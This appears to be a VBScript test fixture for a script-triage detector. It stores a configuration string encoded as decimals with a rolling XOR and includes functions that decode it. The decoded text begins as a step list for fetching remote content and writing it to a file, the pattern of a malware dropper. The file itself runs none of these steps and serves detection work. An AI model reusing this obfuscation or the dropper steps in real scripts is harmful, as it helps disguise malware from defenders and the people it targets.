Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_fa306151 = "72|117|68|56|75|63|90|42|89|100|5|102|23|98|11|121|28|67|49|84|57|86|34|71|107|28|110|7|115|22|73|47|70|42|79|99|7|110|29|109|12|120|27|115|44|92|46|65|34|71|52|71|107|3|98|12|104|7|97|7|88|43|72|58|83|35|87|43|74|46|79|63|75|46|92|97|44|69|38|84|59|72|39|65|53|27|67|14|66|10|94|10|90|38|85|33|64|39|66|29|126|17|100|10|126|67|119|11|104|9|100|20|117|28|123|21|74|35|71|122|25|120|21|101|4|109|10|100|73|124|30|43|31|40|77|43|25|123|72|52|65|51|95|98|10|126|10|122|9|51|28|51|6|100|81|101|82|55|81|99|1|50|28|121|1|96|13|125|17|116|90|51|93|43|74|38|79|43|4|48|82|97|84|102|4|96|3|45|73|40|92|32|85|38|67|49|110|15|104|13|99|23|42|98|23|121|13|127|26|105|26|86|55|85|122|79|45|24|44|27|126|24|42|72|123|7|97|8|100|1|94|46|79|59|83|110|45|23|75|30|109|8|122|9|85|5|112|18|126|23|116|40|96|21|123|15|125|24|107|24|84|53|87|11|120|12|109|10|111|66|119|21|32|20|35|70|32|18|112|67|109|9|104|28|96|18|119|16|121|10|126|12|117|42|90|59|79|39|26|82|25|90|15|83|0|111|9|125|10|107|25|124|32|104|29|115|7|117|16|99|16|92|61|95|3|71|46|93|45|66|49|80|50|94|59|103|82|48|5|49|6|99|5|55|85|102|26|116|17|105|29|66|49|69|36|67|38|27|105|12|127|16|101|23|116|17|60|79|46|67|51|95|58|20|100|23|38"
Const Codec_fa306151 = "decimal_pipe|rolling_xor|3e"

Function Load_fa306151()
  Dim parts, result(), i
  parts = Split(Material_fa306151, "|")
  ReDim result(UBound(parts))
  For i = 0 To UBound(parts)
    result(i) = CInt(parts(i))
  Next
  Load_fa306151 = result
End Function

Function Decode_fa306151(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  previous = 62
  For i = 0 To UBound(s)
    result(i) = s(i) Xor previous
    previous = s(i)
  Next
  Decode_fa306151 = result
End Function

Function Recover_fa306151()
  Dim s, d, t, n, i, p, e, q
  ' configuration reconstruction
n = LCase(UCase("Host"))
  s = Load_fa306151()
  p = 0
  While p < 1
    d = Decode_fa306151(s)
    p = p + 1
  Wend
  t = ""
  For i = 0 To UBound(d)
    t = t & Chr(d(i))
  Next
' reconstruction complete
  Recover_fa306151 = t
End Function

Function Inspect_fa306151()
  Dim fields
  fields = Split(Recover_fa306151(), "|")
  Inspect_fa306151 = Join(fields, "|")
End Function
